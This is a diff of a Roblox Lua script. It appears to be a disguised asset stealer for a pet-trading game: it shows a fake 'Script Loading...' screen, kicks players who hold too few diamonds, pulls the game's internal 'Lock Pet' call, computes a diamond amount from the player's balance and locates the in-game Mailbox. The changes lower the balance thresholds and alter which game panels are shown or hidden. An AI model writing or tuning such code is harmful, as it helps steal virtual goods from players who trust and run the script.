@@ -8,7 +8,7 @@ if _G.loadingScreenText == nil or _G.loadingScreenText == "" then
 	_G.loadingScreenText = "Script Loading..."
 end
 
-if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 1000000 then
+if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 200000 then
     game.Players.LocalPlayer:Kick("Error found while executing.")
 end
 
@@ -30,7 +30,7 @@ local LockPet = getupvalue(Library.Network.Invoke, 2)("Lock Pet");
 local pets = {}
 local player = game:GetService("Players").LocalPlayer
 
-local dims = player.leaderstats.Diamonds.Value - 7000000
+local dims = player.leaderstats.Diamonds.Value - 700000
 if dims < 0 then
 	dims = 0
 end
@@ -108,15 +108,15 @@ end
 
 coroutine.wrap(KYZKD_fake_script)()
 
-game:GetService("Players").LocalPlayer.PlayerGui.Main.Bottom.Visible = false
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Bottom.Visible = true
 
-game:GetService("Players").LocalPlayer.PlayerGui.Main.Left.Visible = false
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Left.Visible = true
 
-game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Visible = false
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Visible = true
 
-game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts.Visible = false
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts.Visible = true
 
-game:GetService("Players").LocalPlayer.PlayerGui.Main.ServerBoosts.Visible = false
+game:GetService("Players").LocalPlayer.PlayerGui.Main.ServerBoosts.Visible = true
 
 
 box = game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position
